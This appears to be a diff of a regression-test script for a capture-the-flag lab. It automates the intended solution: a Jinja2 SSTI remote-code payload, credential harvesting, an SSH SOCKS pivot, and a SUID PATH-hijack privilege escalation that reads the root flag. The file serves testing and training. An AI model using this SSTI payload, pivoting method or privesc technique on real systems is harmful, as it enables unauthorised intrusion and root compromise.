@@ -2,19 +2,25 @@
 # ============================================================================
 #  solve.sh — automated golden-path regression test for the Ambiorix CTF.
 #
-#  Drives the FULL intended solution from inside the attacker container and
-#  asserts the flag is recovered. Run after `docker compose up -d --build`.
+#  Drives the FULL intended solution the way a player does: from the HOST,
+#  against the published ports (no in-lab attacker box). Asserts the flag is
+#  recovered. Run after `docker compose up -d --build`.
+#
+#  Needs on the host:  bash, curl, ssh, ncat (nmap-ncat / nc-openbsd), setsid.
+#  No sshpass or proxychains required — passwords are fed via SSH_ASKPASS and
+#  the SOCKS pivot uses ncat as the ProxyCommand.
 #
 #  Usage:
 #     ./test/solve.sh
-#     COMPOSE="podman-compose" ./test/solve.sh      # alternate compose tool
+#     WEB=http://127.0.0.1:8080 SSH_PORT=2022 ./test/solve.sh   # override ports
 # ============================================================================
 set -u
 
-COMPOSE="${COMPOSE:-docker compose}"
-EXEC() { $COMPOSE exec -T attacker "$@"; }
+WEB="${WEB:-http://127.0.0.1:8080}"     # published pivot web console
+SSH_HOST="${SSH_HOST:-127.0.0.1}"       # published pivot SSH host
+SSH_PORT="${SSH_PORT:-2022}"            # published pivot SSH port
+SOCKS_PORT="${SOCKS_PORT:-1080}"        # local SOCKS port for the SSH -D tunnel
 
-PIVOT=172.20.0.10
 TARGET=10.10.10.10
 EXPECTED='flag{atuatuca_ambush_54bc}'
 
@@ -22,60 +28,68 @@ WEB_USER=tiro;   WEB_PASS='AveLegioXIV-54'
 SCOUT_PASS='FrontierWatch-54BC'
 EBURO_PASS='ArduennaShadow'
 
-SSHOPTS='-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR'
+SSHOPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR"
 
 say() { printf '\n\033[1;33m[*] %s\033[0m\n' "$1"; }
 ok()  { printf '\033[1;32m    OK: %s\033[0m\n' "$1"; }
 die() { printf '\033[1;31m[!] FAIL: %s\033[0m\n' "$1"; cleanup; exit 1; }
 
-cleanup() { EXEC pkill -f 'ssh.*-D 1080' >/dev/null 2>&1 || true; }
+# --- password-fed ssh without sshpass (SSH_ASKPASS + detached session) --------
+ASKPASS="$(mktemp)"
+printf '#!/bin/sh\necho "$PW"\n' > "$ASKPASS"; chmod +x "$ASKPASS"
+# pssh PASSWORD -- ssh-args...   (runs ssh non-interactively with PASSWORD)
+pssh() { local pw="$1"; shift; PW="$pw" SSH_ASKPASS="$ASKPASS" SSH_ASKPASS_REQUIRE=force \
+         DISPLAY=:0 setsid -w ssh $SSHOPTS "$@"; }
+
+TUN_PID=""
+cleanup() {
+  [ -n "$TUN_PID" ] && kill "$TUN_PID" 2>/dev/null
+  rm -f "$ASKPASS" 2>/dev/null
+}
 trap cleanup EXIT
 
 # ----------------------------------------------------------------------------
-say "Stage 0 — isolation invariant: attacker must NOT reach the target directly"
-if EXEC ping -c1 -W2 "$TARGET" >/dev/null 2>&1; then
-  die "attacker reached $TARGET directly — the pivot is not enforced!"
+say "Stage 0 — isolation invariant: the target must NOT be reachable directly"
+if ncat -z -w2 "$TARGET" 22 >/dev/null 2>&1; then
+  die "reached $TARGET:22 directly from the host — the pivot is not enforced!"
 fi
-ok "target $TARGET is unreachable from the frontier (as intended)"
+ok "target $TARGET is unreachable directly (as intended — only via the pivot)"
 
 # ----------------------------------------------------------------------------
 say "Stage 1 — foothold: log in + SSTI RCE -> recover scout SSH creds"
 SSTI='{{ cycler.__init__.__globals__.os.popen("cat /opt/castra/DEPLOY_NOTES.txt").read() }}'
-EXEC bash -c "
-  C=/tmp/jar_solve
-  curl -s -c \$C -b \$C -d 'username=$WEB_USER&password=$WEB_PASS' http://$PIVOT/login -o /dev/null
-  curl -s -c \$C -b \$C --data-urlencode 'report=' --data-urlencode 'sigil=$SSTI' http://$PIVOT/board
-" | grep -q "scout / $SCOUT_PASS" || die "SSTI RCE did not return the scout creds"
+C="$(mktemp)"
+curl -s -c "$C" -b "$C" -d "username=$WEB_USER&password=$WEB_PASS" "$WEB/login" -o /dev/null
+curl -s -c "$C" -b "$C" --data-urlencode 'report=' --data-urlencode "sigil=$SSTI" "$WEB/board" \
+  | grep -q "scout / $SCOUT_PASS" || die "SSTI RCE did not return the scout creds"
+rm -f "$C"
 ok "SSTI RCE works; deploy notes leak scout / $SCOUT_PASS + inner host $TARGET"
 
 # ----------------------------------------------------------------------------
 say "Stage 2 — pivot: read muster roll, then open an SSH -D SOCKS tunnel"
-EXEC bash -c "SSHPASS='$SCOUT_PASS' sshpass -e ssh $SSHOPTS scout@$PIVOT 'cat ~/muster.txt'" \
+pssh "$SCOUT_PASS" -p "$SSH_PORT" "scout@$SSH_HOST" 'cat ~/muster.txt' 2>/dev/null \
   | grep -q "eburo / $EBURO_PASS" || die "could not read the inner-camp creds from scout's home"
 ok "muster roll leaks eburo / $EBURO_PASS"
 
-cleanup; sleep 1
-# Hold the SSH dynamic forward open in a SEPARATE, host-side backgrounded exec.
-# This keeps the long-running tunnel out of the capture session below, which is
-# what makes it robust under both `docker compose` and `podman-compose` exec.
-$COMPOSE exec -T attacker \
-  bash -c "SSHPASS='$SCOUT_PASS' exec sshpass -e ssh $SSHOPTS -N -D 1080 scout@$PIVOT" \
-  >/dev/null 2>&1 &
-TUN_HOST_PID=$!
-sleep 4
-EXEC bash -c "ss -tln 2>/dev/null | grep -q ':1080 '" \
-  || die "SOCKS tunnel on :1080 did not come up"
-ok "SSH -D 1080 tunnel through castra is up (proxychains -> socks5 127.0.0.1:1080)"
+# Hold the SSH dynamic forward (SOCKS5 on 127.0.0.1:$SOCKS_PORT) open.
+pssh "$SCOUT_PASS" -N -D "$SOCKS_PORT" -p "$SSH_PORT" "scout@$SSH_HOST" >/dev/null 2>&1 &
+TUN_PID=$!
+for _ in $(seq 1 10); do
+  ncat -z -w1 127.0.0.1 "$SOCKS_PORT" >/dev/null 2>&1 && break; sleep 1
+done
+ncat -z -w1 127.0.0.1 "$SOCKS_PORT" >/dev/null 2>&1 \
+  || die "SOCKS tunnel on :$SOCKS_PORT did not come up"
+ok "SSH -D $SOCKS_PORT tunnel through castra is up (SOCKS5 127.0.0.1:$SOCKS_PORT)"
 
 # ----------------------------------------------------------------------------
-say "Stage 3 — inner objective: proxychains to target, SUID PATH-hijack privesc"
+say "Stage 3 — inner objective: pivot to target, SUID PATH-hijack privesc"
 # Plant a shebang-less 'date' script (run by /bin/sh inside the SUID binary);
 # PATH hijack makes castellum execute it as root -> it cats the flag.
+# ncat bridges ssh to the target through the SOCKS proxy (stand-in for proxychains).
+PROXYCMD="ncat --proxy 127.0.0.1:$SOCKS_PORT --proxy-type socks5 %h %p"
 RCMD='cd /tmp && echo "cat /root/flag.txt" > date && chmod +x date && PATH=/tmp:$PATH /usr/local/bin/castellum'
-FLAG=$(EXEC bash -c "SSHPASS='$EBURO_PASS' proxychains4 -q sshpass -e ssh $SSHOPTS eburo@$TARGET '$RCMD'" 2>/dev/null \
+FLAG=$(pssh "$EBURO_PASS" -o "ProxyCommand=$PROXYCMD" "eburo@$TARGET" "$RCMD" 2>/dev/null \
        | grep -o 'flag{[^}]*}' | head -1)
-
-kill "$TUN_HOST_PID" 2>/dev/null || true
 
 # ----------------------------------------------------------------------------
 say "Result"
